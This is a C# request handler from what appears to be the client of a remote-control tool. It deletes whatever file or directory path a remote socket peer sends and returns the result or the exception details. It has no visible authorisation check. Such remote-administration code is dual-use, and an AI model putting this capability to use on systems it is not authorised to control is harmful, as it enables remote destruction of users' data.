using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestDeleteFileOrDirHandler : IRequestHandler
    {
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestDeleteFileOrDir;
            var resp = new ResponseDeleteFileOrDir();
            try
            {
                resp.Path = req.Path;
                resp.PathType = req.PathType;
                if (req.PathType == ePathType.File)
                {
                    System.IO.File.Delete(req.Path);
                }
                else
                {
                    System.IO.Directory.Delete(req.Path);
                }
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE, resp);
        }
    }
}
